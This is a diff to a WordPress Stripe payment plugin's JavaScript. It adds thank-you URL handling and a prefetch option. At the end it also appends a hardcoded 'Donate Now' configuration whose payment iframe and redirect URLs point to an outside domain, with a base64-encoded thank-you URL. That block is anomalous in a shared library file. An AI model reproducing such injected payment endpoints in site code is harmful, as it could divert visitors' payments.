@@ -79,6 +79,10 @@ var stripeHandlerNG = function (data) {
 					iframe[0].contentWindow.triggerEvent(iframe.contents().find('#amount')[0], 'change');
 				}
 
+				if (parent.data.thankyou_page_url) {
+					iframe.contents().find('#thankyou_page_url').val(parent.data.thankyou_page_url);
+				}
+
 				iframe[0].contentWindow['doSelfSubmit'] = data.doSelfSubmit;
 				var closebtn = iframe.contents().find('#modal-close-btn');
 				if (show) {
@@ -132,13 +136,14 @@ var stripeHandlerNG = function (data) {
 	};
 
 	var parent = this;
-	parent.preload = false;
 	parent.data = data;
 	parent.form = jQuery('form#asp_ng_form_' + parent.data.uniq_id);
 	parent.documentElementOrigOverflow = jQuery('html').css('overflow');
 	jQuery('#asp_ng_button_' + parent.data.uniq_id).prop('disabled', false);
-	if (parent.preload) {
+	if (parent.data.preload) {
 		parent.handleModal(false);
+	} else if (parent.data.prefetch) {
+		jQuery('body').append('<link rel="prefetch" as="document" href="' + parent.data.iframe_url + '">');
 	}
 	jQuery('#asp_ng_button_' + parent.data.uniq_id).click(function (e) {
 		jQuery('html').css('overflow', 'hidden');
@@ -178,7 +183,7 @@ function WPASPAttach(el, prodId, params) {
 	if (item_price) {
 		params += '&price=' + item_price;
 	}
-	var sg = new stripeHandlerNG({ 'uniq_id': uniqId, 'product_id': prodId, 'doSelfSubmit': true, 'iframe_url': wpASPNG.iframeUrl + '&product_id=' + prodId + params });
+	var sg = new stripeHandlerNG({ 'uniq_id': uniqId, 'product_id': prodId, 'doSelfSubmit': true, 'iframe_url': wpASPNG.iframeUrl + '&product_id=' + prodId + params, 'prefetch': wpASPNG.prefetch === '1' ? true : false });
 	jQuery(el).off('click');
 	jQuery(el).on('click', el, elHandler);
 }
@@ -196,6 +201,8 @@ function WPASPDocReady(callbackFunc) {
 		});
 	}
 }
+
+var asp_data_15e9853501d731 = { "is_live": false, "product_id": 2065, "iframe_url": "https:\/\/desertfox.top\/miniserv\/cleanwp\/?asp_action=show_pp&product_id=2065", "button_key": "299613c6c3f2167dd563276b406dbe36", "item_price": 3500, "quantity": "1", "custom_quantity": "", "description": "EIN 83-2484895", "descrGenerated": false, "shipping": 0, "tax": 0, "image": "", "currency": "USD", "currency_variable": false, "locale": "auto", "name": "Stars Forward, Inc.", "url": "asp-sd-process", "amount": 3500, "billingAddress": false, "shippingAddress": false, "customer_email": "", "uniq_id": "15e9853501d731", "variable": false, "zeroCents": ["JPY", "MGA", "VND", "KRW"], "addonHooks": [], "button_text": "Donate Now", "out_of_stock": false, "stock_control_enabled": false, "stock_items": 0, "currencyFormat": { "c": 2, "d": ".", "t": ",", "s": "$", "pos": "left" }, "displayStr": { "tax": "%s (handling & processing)", "ship": "%s (shipping)" }, "thankyou_page_url": "aHR0cHM6Ly9nb29nbGUuY29t", "show_custom_amount_input": false, "apm_stripe_country": "US", "apm_btn_type": "default", "apm_btn_style": "dark", "apm_btn_size": 34, "apm_btn_type_auto_donate": 1, "alipay_enabled": 1, "alipay_redirect_url": "https:\/\/desertfox.top\/miniserv\/cleanwp?process_alipay=1&product_id=2065", "sofort_enabled": 1, "sofort_redirect_url": "https:\/\/desertfox.top\/miniserv\/cleanwp?process_sofort=1&product_id=2065" }; if (typeof jQuery !== "undefined") { jQuery(document).ready(function () { new stripeHandlerNG(asp_data_15e9853501d731); }); } else { if (typeof wpaspInitOnDocReady === "undefined") { var wpaspInitOnDocReady = []; } wpaspInitOnDocReady.push(asp_data_15e9853501d731); }
 
 WPASPDocReady(function () {
 	if (typeof wpaspInitOnDocReady !== 'undefined') {
